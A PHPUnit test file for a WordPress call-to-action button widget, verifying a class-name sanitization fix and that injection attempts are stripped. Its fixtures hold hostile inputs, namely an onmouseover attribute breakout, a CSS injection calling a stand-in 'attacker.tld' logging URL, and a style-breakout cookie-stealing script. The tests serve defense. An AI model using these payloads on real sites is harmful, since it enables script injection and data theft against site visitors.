<?php

use Brain\Monkey;
use Brain\Monkey\Functions;
use PHPUnit\Framework\TestCase;

/**
 * Tests for CTA::printWidget() -- issue #2916.
 *
 * cta-button-widget.class.php is the sibling of icon-link-widget.class.php and
 * carries the same two defects, so it is fixed in the same change even though
 * the issue lists only the icon-link lines:
 *
 *   - line 116 called sanitize_html_class(@$instance['classname']), which
 *     sanitizes ONE class name. It strips whitespace, so the first two-word
 *     value anyone saves is silently welded into a class that matches no
 *     stylesheet rule. Only "action" and "card-inverse" are stored on a
 *     production database copy today, which is the only reason this has not
 *     already broken. \Proud\Core\sanitize_html_classes() splits on whitespace
 *     first and is safe for the same attribute position.
 *
 *   - line 89 reads $instance['classname'] with no default, so a legacy
 *     instance saved before the Style field existed raises an undefined-index
 *     notice there. The @ on line 116 was suppressing the second read of the
 *     same missing key, not the first.
 */
class CtaButtonWidgetTest extends TestCase
{
    use AppliesPreKsesFilter;

    protected function setUp(): void
    {
        parent::setUp();
        Monkey\setUp();
        $this->applyPreKsesFilter();

        // Faithful esc_html()/esc_url(): the stubs.php defaults are
        // passthroughs, which would rubber-stamp the assertions below.
        Functions\when('esc_html')->alias(static function ($text) {
            return htmlspecialchars((string) $text, ENT_QUOTES, 'UTF-8', false);
        });
        Functions\when('esc_url')->alias(static function ($url) {
            $url = (string) $url;
            if ('' === $url) {
                return '';
            }
            if (preg_match('#^\s*javascript\s*:#i', $url)) {
                return '';
            }
            if (!preg_match('#^[a-zA-Z][a-zA-Z0-9+.-]*:#', $url) && !in_array($url[0], ['/', '#', '?'], true)) {
                $url = 'http://' . $url;
            }
            return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
        });
        Functions\when('get_theme_mod')->justReturn('#e49c11');
    }

    protected function tearDown(): void
    {
        Monkey\tearDown();
        parent::tearDown();
    }

    private function instance(array $overrides = []): array
    {
        return array_merge([
            'link_title' => 'Pay a bill',
            'link_url'   => 'https://example.com/pay',
            'classname'  => '',
        ], $overrides);
    }

    private function render(array $instance): string
    {
        $widget = new CTA();
        ob_start();
        try {
            $widget->printWidget([], $instance);
        } finally {
            $output = (string) ob_get_clean();
        }
        return $output;
    }

    /**
     * The reason this file exists. sanitize_html_class() removes the space and
     * produces "card-btn-actionbtn-lg"; sanitize_html_classes() keeps both
     * names, so both stylesheet rules still match.
     */
    public function test_multi_word_classname_is_not_welded_together(): void
    {
        $output = $this->render($this->instance(['classname' => 'card-inverse btn-lg']));

        $this->assertStringContainsString('card-block card-inverse btn-lg"', $output);
        $this->assertStringNotContainsString('card-inversebtn-lg', $output);
    }

    public function test_real_classname_values_render_unchanged(): void
    {
        foreach (['action', 'card-inverse'] as $classname) {
            $output = $this->render($this->instance(['classname' => $classname]));
            $this->assertStringContainsString(
                'card-btn-action card-block ' . $classname . '"',
                $output,
                "The '{$classname}' style must still reach the class attribute."
            );
        }
    }

    public function test_classname_quote_breakout_is_stripped(): void
    {
        $output = $this->render($this->instance([
            'classname' => 'action" onmouseover="alert(1)',
        ]));

        $this->assertStringNotContainsString('onmouseover=', $output);
        $this->assertStringContainsString('card-block action onmouseoveralert1"', $output);
    }

    /**
     * Line 89 reads classname before line 116 does. Notices are converted to
     * exceptions so a re-introduced undefined-index read fails the test instead
     * of being swallowed by the @ that used to sit downstream.
     */
    public function test_missing_classname_key_raises_no_notice(): void
    {
        $instance = $this->instance();
        unset($instance['classname']);

        set_error_handler(static function ($severity, $message) {
            throw new \ErrorException($message, 0, $severity);
        }, E_ALL);

        try {
            $output = $this->render($instance);
        } finally {
            restore_error_handler();
        }

        $this->assertStringContainsString('card-btn-action card-block ', $output);
        $this->assertStringNotContainsString('.card.card-btn.action {', $output, 'No action colour block without classname="action".');
    }

    public function test_action_classname_still_emits_the_style_block(): void
    {
        $output = $this->render($this->instance(['classname' => 'action']));

        $this->assertStringContainsString('.card.card-btn.action {', $output);
        $this->assertStringContainsString('background-color: #e49c11;', $output);
    }

    /**
     * The "Standard" style is stored as an empty string, which must not become
     * the literal "action" branch or leave a stray class name behind.
     */
    public function test_empty_classname_renders_no_extra_class(): void
    {
        $output = $this->render($this->instance(['classname' => '']));

        $this->assertStringContainsString('card-btn-action card-block "', $output);
        $this->assertStringNotContainsString('.card.card-btn.action {', $output);
    }

    /**
     * End-to-end cover for the security-review finding: a hostile
     * color_action_button theme mod must not reach the <style> block. The
     * helper is unit tested in ActionButtonColorTest; this proves the widget
     * actually calls it, so a revert to the bare get_theme_mod() + esc_html()
     * pair fails here. esc_html() would have let this payload through intact --
     * CSS injection needs none of the characters it encodes.
     */
    public function test_hostile_theme_mod_cannot_inject_css(): void
    {
        Functions\when('get_theme_mod')
            ->justReturn('#fff; } body { background-image: url(https://attacker.tld/log?c=x) } .x {');

        $output = $this->render($this->instance(['classname' => 'action']));

        $this->assertStringNotContainsString('attacker.tld', $output);
        $this->assertStringNotContainsString('background-image', $output);
        $this->assertStringContainsString('background-color: #e49c11;', $output);
    }

    /**
     * The Gravity Forms sibling sink concatenated this with no escaping at
     * all. Neither widget was exploitable that way -- esc_html() blocked the
     * breakout -- but the same payload must now not survive even encoded.
     */
    public function test_hostile_theme_mod_cannot_break_out_of_the_style_element(): void
    {
        Functions\when('get_theme_mod')
            ->justReturn('#fff}</style><script>alert(document.cookie)</script><style>');

        $output = $this->render($this->instance(['classname' => 'action']));

        $this->assertStringNotContainsString('script', $output);
        $this->assertStringNotContainsString('&lt;/style&gt;', $output);
        $this->assertStringContainsString('background-color: #e49c11;', $output);
    }
}
